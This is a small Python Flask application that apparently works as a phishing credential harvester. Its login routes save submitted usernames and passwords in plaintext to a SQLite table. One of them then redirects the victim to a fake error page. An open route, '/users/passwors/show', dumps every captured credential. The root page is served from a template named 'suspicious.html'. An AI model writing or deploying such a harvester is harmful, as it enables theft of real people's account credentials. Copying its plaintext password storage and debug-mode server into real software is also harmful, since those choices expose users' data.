from sqlite3.dbapi2 import connect
from flask import Flask,request
from flask.helpers import url_for
from flask.templating import render_template
from werkzeug.utils import redirect
import sqlite3
import os

app = Flask(__name__)



@app.route("/users/passwors/show")
def lol():
    connection = sqlite3.connect("users.db")
    curso1r = connection.cursor()
    q = "SELECT * FROM passwords"
    curso1r.execute(q)
    a = curso1r.fetchall()
    connection.commit()
    connection.close()
    
    print(a)
    values = ','.join(str(v) for v in a)
    return values
    

@app.route("/login", methods = ['POST','GET'])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        passwords = request.form.get("password")
        print(username)
        connection = sqlite3.connect("users.db")
        cursor = connection.cursor()
        q = "INSERT INTO passwords(username,password)VALUES(?,?)"
        cursor.execute(q,(username,passwords))
        connection.commit()
        connection.close()
        

    return render_template("index.html")    

@app.route("/accounts/login", methods = ['POST','GET'])
def error():
    if request.method == "POST":
        username = request.form.get("username")
        passwords = request.form.get("password")
        
        connection = sqlite3.connect("users.db")
        cursor = connection.cursor()
        print("***********************************************")
        print(username)
        cursor.execute("INSERT INTO passwords(username,password)VALUES(?,?)",(username,passwords))
        connection.commit()
        connection.close()
        return redirect(url_for("missleas"))
    return render_template("index.html")    
@app.route("/accounts", methods = ['POST','GET'])
def missleas():
    return render_template("error.html")

@app.route("/", methods = ['POST','GET'])
def main():
    
    return render_template("suspicious.html")

if __name__ == "__main__":
    app.run(debug=True)
